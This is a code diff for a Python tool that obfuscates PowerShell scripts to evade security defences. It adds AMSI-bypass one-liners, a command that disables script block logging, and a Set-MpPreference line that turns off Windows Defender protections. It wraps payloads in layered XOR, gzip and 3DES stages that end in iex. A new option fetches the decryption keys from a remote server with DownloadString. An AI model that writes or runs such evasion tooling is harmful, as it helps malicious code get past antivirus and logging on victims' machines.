@@ -20,16 +20,40 @@ DEBUG = False
 O_DEBUG = False
 O_DEBUG_PATH = './debug_obfu/'
 
+ender = """echo all i wanna see"""
+
+
 AVAILABLE_STRING_METHODS = []
 
 bypass = [
-    """[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)""",
-    """[Ref].Assembly.GetType("Management.Automation.Sc"+"riptBlock").GetField("signatures","NonPublic,static").SetValue($null,(New-Object 'Collections.Generic.HashSet[string]'))""",
+    """[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)""",
+    """[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object "System.Collections.Generic.HashSet[string]"))""",
     """$settings=[Ref].Assembly.GetType("Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)""",
     """$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}""",
     """$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")""",
-#    """Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend""",
+    """[ScriptBlock].GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))""",
+    """Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend""",
+    """write bypass done """,
     ]
+
+
+def sizeof_fmt(num, suffix='B'):
+    for unit in ['','Ki','Mi','Gi','Ti','Pi','Ei','Zi']:
+        if abs(num) < 1024.0:
+            return "%3.1f%s%s" % (num, unit, suffix)
+        num /= 1024.0
+    return "%.1f%s%s" % (num, 'Yi', suffix)
+
+def rand_case(s):
+    if type(s) != str:
+        s = s.decode('utf-8')
+    return ''.join(x.lower() if round(random.random()) else x.upper() for x in s)
+
+def rand_char():
+    return random.choice(string.ascii_letters)
+
+def rand_string(l=8):
+    return ''.join(random.choice(string.ascii_letters+string.digits) for x in range(l))
 
 def get_cmdlets():
     log.info('Getting commandlets')
@@ -52,11 +76,16 @@ def wrap_try(s):
     log.debug('Running Wrap Try')
     if type(s) != str:
         s = s.decode('utf-8')
-    return 'try{{{0}}}catch{{}}'.format(s)
+    return 'try{{{0}}}catch{{write $_.Exception.Message}}'.format(s)
 
 def build_bypass(l=bypass):
     log.info('Building Bypass')
-    return ';'.join(map(wrap_try,l))
+    
+    dbg = ''
+    if O_DEBUG:
+        dbg = 'echo "Starting bypass";'
+
+    return dbg + ';'.join(map(wrap_try,l))
 
 def fs_xor(s, k=None):
     log.info('Running Forward Single Char XOR Obfuscation')
@@ -65,7 +94,18 @@ def fs_xor(s, k=None):
     if not k:
         k = random.choice(list(string.ascii_letters+string.digits))
     s = ''.join([chr(ord(x) ^ ord(k)) for x in s ]).encode('utf-8')
-    return dwrite('''$x="";$a=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}"));for($i=0;$i -le $a.Length-1;$i++){{$x+=[char]($a[$i]-bxor\'{1}\'[0])}};iEx($x);'''.lower().format(base64.b64encode(s).decode('utf-8'), k))
+    k = str(ord(k))
+    if args.online:
+        k = online_resource(k)
+    else:
+        k = "'"+k+"'"
+    
+    dbg = ''
+    if O_DEBUG:
+        dbg = 'echo "Starting fs_xor";'
+    
+    return dwrite(rand_case('''$x="";{2};$a=[Convert]::FromBase64String("{0}");$d={1};for($i=0;$i -le $a.Length-1;$i++){{$a[$i]=$a[$i]-bxor $d}};clear-variable d,i;iEx([Text.Encoding]::UTF8.GetString($a));''').format(base64.b64encode(s).decode('utf-8'), k, dbg))
+
 
 def rs_xor(s, k=None):
     log.info('Running Reverse Single Char XOR Obfuscation')
@@ -74,7 +114,18 @@ def rs_xor(s, k=None):
     if not k:
         k = random.choice(list(string.ascii_letters+string.digits))
     s = ''.join([chr(ord(x) ^ ord(k)) for x in s ])[::-1].encode('utf-8')
-    return dwrite('''$x="";$a=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}"));for($i=$a.Length;$i--;){{$x+=[char]($a[$i]-bxor\'{1}\'[0])}};iEx($x);'''.lower().format(base64.b64encode(s).decode('utf-8'), k))
+    
+    if args.online:
+        k = online_resource(k)
+    else:
+        k= "'"+k+"'"
+    
+    dbg = ''
+    if O_DEBUG:
+        dbg = 'echo "Starting rs_xor";'
+
+    return dwrite(rand_case('''$x="";{2};$a=[Convert]::FromBase64String("{0}");$d={1};for($i=$a.Length;$i--;){{$a[$i]=$a[$i]-bxor $d}};clear-variable d,i;iEx([Text.Encoding]::UTF8.GetString($a));''').format(base64.b64encode(s).decode('utf-8'), k,dbg))
+
 
 def fm_xor(s, k='', length=None):
     log.info('Running Forward Multi Char XOR Obfuscation')
@@ -83,41 +134,72 @@ def fm_xor(s, k='', length=None):
     if not len(k) or not length:
         length = random.randint(1,99)
         k = ''.join([random.choice(list(string.ascii_letters+string.digits)) for x in range(length)])
+
     s = ''.join([chr(ord(x) ^ ord(k[i%len(k)])) for i,x in enumerate(s)]).encode('utf-8')
-    return dwrite('''$x="";$a=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}"));$z=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{1}"));for($i=0;$i -le $a.Length-1;$i++){{$x+=[char]($a[$i]-bxor $z[$i%$z.length])}};iEx($x);'''.lower().format(base64.b64encode(s).decode('utf-8'), base64.b64encode(k.encode('utf-8')).decode('utf-8')))
+    k = base64.b64encode(k.encode('utf-8')).decode('utf-8')
+
+    if args.online:
+        k = online_resource(k)
+    else:
+        k = '"'+k+'"'
+
+    dbg = ''
+    if O_DEBUG:
+        dbg = 'echo "Starting fm_xor";'
+
+    return dwrite(rand_case('''$x="";{2};$a=[Convert]::FromBase64String("{0}");$z=[Convert]::FromBase64String({1});for($i=0;$i -le $a.Length-1;$i++){{$a[$i]=$a[$i]-bxor $z[$i%$z.length] }};clear-variable z,i;iEx([Text.Encoding]::UTF8.GetString($a));clear-variable a,x,o''').format(base64.b64encode(s).decode('utf-8'), k, dbg))
 
 def b64(s):
     log.info('Running Base64 Obfuscation')
     if type(s) != bytes:
         s = s.encode('utf-8')
-    return dwrite('iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}")))'.lower().format(base64.b64encode(s).decode('utf-8')))
+
+    dbg = ''
+    if O_DEBUG:
+        dbg = 'echo "Starting b64";'
+
+    return dwrite(';{1};iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}")))'.rand_case().format(base64.b64encode(s).decode('utf-8'), dbg))
 
 def gz(s):
+    if args.pad:
+        log.info(f"pre-pad size: {sizeof_fmt(sys.getsizeof(s))}") 
+        s += '\n'*args.pad+';'
+        log.info(f"after-pad size: {sizeof_fmt(sys.getsizeof(s))}") 
+
     log.info('Running GZIP Obfuscation')
     if type(s) != bytes:
         s = s.encode('utf-8')
+    
+    
+    pre_len = len(s)-1
     s = gzip.compress(s)
-    return dwrite('''$i=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{0}"));$o=New-Object IO.MemoryStream;$g=New-Object IO.Compression.GzipStream $i,([IO.Compression.CompressionMode]::Decompress);$g.CopyTo($o);iEx([Text.Encoding]::UTF8.'GetString'($o.ToArray()));'''.lower().format(base64.b64encode(s).decode('utf-8')))
 
+    dbg = ''
+    if O_DEBUG:
+        dbg = 'echo "Starting gzip";'
+
+    
+    return dwrite(rand_case(''';{1};$i=New-Object IO.MemoryStream(,[Convert]::FromBase64String('{0}'));$o=New-Object IO.MemoryStream;$g=New-Object IO.Compression.GzipStream $i,([IO.Compression.CompressionMode]::Decompress);$g.CopyTo($o);clear-variable g,i,x;iEx([Text.Encoding]::UTF8.'GetString'($o.ToArray()));clear-variable o;''').format(base64.b64encode(s).decode('utf-8'), dbg ))
+    #return dwrite(rand_case('''$i=New-Object IO.MemoryStream(,[Convert]::FromBase64String('{0}'));$o=New-Object IO.MemoryStream;$g=New-Object IO.Compression.GzipStream $i,([IO.Compression.CompressionMode]::Decompress);$r="";for($u=0;$u -le {1}; $u++){{$r+=[Text.Encoding]::UTF8.GetString($g.readbyte())}};iEx($r);''').format(base64.b64encode(s).decode('utf-8'), pre_len )) # less mem but much more compute, maybe in a mem restricted env???
 
 def remove_quotes(s):
+    if (s[0] in ("@",) and s[-1] in ("@",)) and s[1] in ("'",'"') and s[-2] in ("'",'"'):
+        s = s[2:-2]
     if s[0] in ("'",'"') and s[-1] in ("'",'"'):
         s = s[1:-1]
-    if (s[0] in ("@",) and s[-1] in ("@",)) and s[0] in ("'",'"') and s[-1] in ("'",'"'):
-        s = s[2:-2]
     return s
 
 def string_obfu_method1(s):
-    ret = "({0})".format('+'.join([ f'[char]{ord(x)}' for x in s]))
+    ret = "({0})".format('+'.join([ f'[char]{ord(x)}' for x in remove_quotes(s)]))
     return ret
 
 def string_obfu_method2(s):
-    ret = "({0}|%{{($_.length-as[char])}})-join''".format( ','.join([f"'{' '*ord(x)}'" for x in s]))
+    ret = "({0}|%{{($_.length-as[char])}})-join''".format( ','.join([f"'{' '*ord(x)}'" for x in remove_quotes(s) ]))
     return ret
 
 def rand_string_obfu(s,available_methods):
     m = random.choice(available_methods)
-    log.debug("{0} Chosen for string".format(m.__name__))
+    log.debug(f"{m.__name__} Chosen for string")
     ret = m(s)
     return ret
 
@@ -127,31 +209,34 @@ def string_obfu(s):
     if type(s) != str:
         s = s.decode('utf-8')
     f_strings,m_strings,find = [],[],[]
-
+    #print(s)
     find.extend(re.findall('(@".{10,}?"@)|(@\'.{10,}?\'@)',s,re.DOTALL+re.MULTILINE))
     find.extend(re.findall('(".*?")|(\'.*?\')',s))
+    #print('asd',find)
     if find:
-        [[f_strings.append(a) for a in x if len(a)>2] for x in find]
+        [[f_strings.append(a) for a in x if len(a)>4] for x in find]
         if f_strings:
+            #print('dsa',f_strings)
             for st in f_strings:
                 n = rand_string_obfu(st, AVAILABLE_STRING_METHODS)
-                if '$' not in st and list(set(st)) == " ":
+                if '$' not in st and list(set(st)) != " ":
+                    log.debug(f"obfu: {st} {n}")
                     s = s.replace(st,n,1)
-    
     return dwrite(s)
 
 def triple_des(s):
-    if type(s) != str:
-        s = s.decode('utf-8')
+    if type(s) != bytes:
+        s = s.encode('latin1')
+    
     log.info('Running 3DES Obfuscation')
     key = os.getrandom(16)
     iv = os.getrandom(8)
     des = DES3.new(key, DES3.MODE_CBC, iv)
-    s += ' '*(8-(len(s)%8))
+    s += b' '*(8-(len(s)%8))
     enc = des.encrypt(s)
     dec = DES3.new(key, DES3.MODE_CBC, iv)
     try:
-        if dec.decrypt(enc) == s.encode('utf-8'):
+        if dec.decrypt(enc) == s:
             log.debug("Encryption is working fine")
         else:
             log.debug("Strings do no match, no other error")
@@ -159,12 +244,44 @@ def triple_des(s):
     except:
         log.error("Encryption is fucked")
         raise Exception('Encryption routine is borked')
-    
     key = base64.b64encode(key).decode('utf-8')
     iv = base64.b64encode(iv).decode('utf-8')
+    
     enc_l = len(enc)
     enc = base64.b64encode(enc).decode('utf-8')
-    return dwrite('$p=New-Object Security.Cryptography.TripleDESCryptoServiceProvider;$p.Padding=1;$d=$p.CreateDecryptor([Convert]::FromBase64String("{0}"),[Convert]::FromBase64String("{1}"));iex([Text.Encoding]::UTF8.GetString($d.TransformFinalBlock([Convert]::FromBase64String("{2}"),0,{3})))'.format(key,iv,enc,enc_l))
+
+    if args.online:
+        key = online_resource(key)
+        iv = online_resource(iv)
+    else:
+        key = f'''"{base64.b64encode(key).decode('utf-8')}"'''
+        iv = f'''"{base64.b64encode(iv).decode('utf-8')}"'''
+    
+    dbg = ''
+    if O_DEBUG:
+        dbg = 'echo "Starting 3des";'
+        
+    return dwrite(rand_case(';{4};$p=New-Object Security.Cryptography.TripleDESCryptoServiceProvider;$p.Padding=1;$d=$p.CreateDecryptor([Convert]::FromBase64String({0}),[Convert]::FromBase64String({1}));iex([Text.Encoding]::UTF8.GetString($d.TransformFinalBlock([Convert]::FromBase64String("{2}"),0,{3})));clear-variable p,d').format(key,iv,enc,enc_l,dbg))
+
+
+def online_resource(s):
+    fp = ''
+    while not os.path.exists(fp):
+        wp = '/'.join([rand_string() for x in range(3)])
+        path = os.path.join(args.keystore_dir,wp)
+        filename = rand_string(8)
+        fp = os.path.join(path,filename)
+        if not os.path.exists(fp):
+            os.makedirs(path, exist_ok=True)
+            f = open(fp,'w')
+            f.write(s)
+            f.flush()
+            f.close()
+            log.info(f"Stored resource at: {fp}")
+
+    return f"((New-Object System.Net.WebClient).DownloadString('{'/'.join((args.url, os.path.join(wp,filename)))}'))"
+        
+
 
 def dwrite(s):
     if O_DEBUG:
@@ -177,9 +294,9 @@ def dwrite(s):
 
 funcs = (fs_xor, # Single-Byte XOR
          fm_xor, # Multi-Byte XOR
-         rs_xor, # reversed Single-Byte XOR
-         b64, # Base64
-         gz, # GZIP
+         #rs_xor, # reversed Single-Byte XOR ; broke right now
+         #b64, # Base64 # disabled for now
+         #gz, # GZIP # disabled for now
          triple_des, # 3DES
          )
 
@@ -212,7 +329,7 @@ def cmdlet_obfu(s):
 
 AVAILABLE_STRING_METHODS = [
     string_obfu_method1,
-    string_obfu_method2,
+    #string_obfu_method2,
 
 ]
 
@@ -222,7 +339,11 @@ if __name__ == "__main__":
     parser.add_argument('-dp', '--debug-obfu-path', help='Obfuscation Debugging Path', default="./debug_obfu/")
     parser.add_argument('-d', '--debug', help='Enable Debug Logging', default=False, action="store_true")
     parser.add_argument('-ng', '--no-gzip', help='No Inital GZIP', default=False, action="store_true")
-    parser.add_argument('-r', '--rounds', help='# of Obfuscation Rounds', type=int, default=2)
+    parser.add_argument('-r', '--rounds', help='# of Obfuscation Rounds', type=int, default=3)
+    parser.add_argument('-p', '--pad', help='Pad gzip with X bytes (new lines)', type=int, default=0)
+    parser.add_argument('-o', '--online', help='Use online keys',default=False, action="store_true")
+    parser.add_argument('-k', '--keystore-dir', help='Keystore dir', default="./keystore")
+    parser.add_argument('-u', '--url', help='URL where keys are', default="http://192.168.122.1/")
     parser.add_argument('file', help='Powershell script to obfuscate, - for stdin')
     args = parser.parse_args()
     
@@ -249,15 +370,26 @@ if __name__ == "__main__":
     p = _file.read()
     p = cmdlet_obfu(p)
     b = string_obfu(build_bypass())
+    #log.info(f"{b}")
+    #print(b)
+    #exit()
     p = string_obfu(p)
     #print(p)
-    #gzip first makes sure its smaller
+    
     if not args.no_gzip:
         p = gz(p)
-    [(a:=random.choice(funcs), p:=a(p), c.append( str(a.__name__) )) for _ in range(args.rounds)]
-    p = '{0};$x="";{1}'.format(b,p)
+        
+    
+    [(a:=random.choice(funcs), p:=(gz(a(p)),log.info(f"Size is now: {sizeof_fmt(sys.getsizeof(p))}"))[0], c.append( str(a.__name__) )) for _ in range(args.rounds)]
+    
+
+    p = '{0};$x="";{1}; write done'.format(b,p)
+    
     if not args.no_gzip:
+        
+        
         p = gz(p)
+    log.info(f"Final length: {sizeof_fmt(sys.getsizeof(p))}")
     print(p)
     log.info("Rounds ran:")
     for r in c:
